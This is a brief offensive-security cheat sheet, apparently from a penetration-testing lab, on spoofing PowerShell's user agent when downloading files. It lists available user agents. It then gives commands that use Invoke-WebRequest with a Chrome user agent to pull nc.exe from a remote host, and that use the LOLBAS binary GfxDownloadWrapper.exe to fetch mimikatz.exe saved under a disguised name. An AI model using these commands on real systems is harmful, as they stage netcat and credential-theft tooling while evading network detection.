
### Changing User Agent

Listing out User Agents
```powershell-session
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Invoke-WebRequest has a parameter to change the user agent/

```powershell-session
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```
```powershell-session
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

You can also use LOLBAS or GTFOBins techniques
```powershell-session
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

